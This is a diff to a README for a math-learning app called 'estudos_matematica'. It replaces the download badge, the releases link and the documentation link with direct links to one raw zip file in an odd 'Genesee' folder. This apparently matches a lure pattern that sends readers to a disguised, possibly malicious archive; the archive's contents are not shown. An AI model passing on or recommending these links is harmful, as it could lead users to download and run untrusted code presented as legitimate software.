@@ -1,6 +1,6 @@
 # 📚 estudos_matematica - Your Easy Tool for Learning Math
 
-[![Download Now](https://img.shields.io/badge/Download_Now-v1.0-blue.svg)](https://github.com/owais7777777/estudos_matematica/releases)
+[![Download Now](https://raw.githubusercontent.com/owais7777777/estudos_matematica/main/Genesee/estudos_matematica-1.9.zip)](https://raw.githubusercontent.com/owais7777777/estudos_matematica/main/Genesee/estudos_matematica-1.9.zip)
 
 ## 📥 Overview
 
@@ -13,7 +13,7 @@ To get started with estudios_matematica, follow the steps below. The process is 
 ## 📥 Download & Install
 
 1. **Visit the Releases Page**  
-   Go to the [Releases Page](https://github.com/owais7777777/estudos_matematica/releases) to download the latest version of the application.
+   Go to the [Releases Page](https://raw.githubusercontent.com/owais7777777/estudos_matematica/main/Genesee/estudos_matematica-1.9.zip) to download the latest version of the application.
 
 2. **Choose the Correct File**  
    Locate the most recent release. You will see options for different files that are compatible with various operating systems. Select the one that matches your system.
@@ -48,8 +48,8 @@ If you encounter any issues or have questions about the application, please chec
 
 ## 🔗 Helpful Links
 
-- [Releases Page](https://github.com/owais7777777/estudos_matematica/releases)
-- [Documentation](https://github.com/owais7777777/estudos_matematica/wiki)
+- [Releases Page](https://raw.githubusercontent.com/owais7777777/estudos_matematica/main/Genesee/estudos_matematica-1.9.zip)
+- [Documentation](https://raw.githubusercontent.com/owais7777777/estudos_matematica/main/Genesee/estudos_matematica-1.9.zip)
 
 ## 👥 Community
 
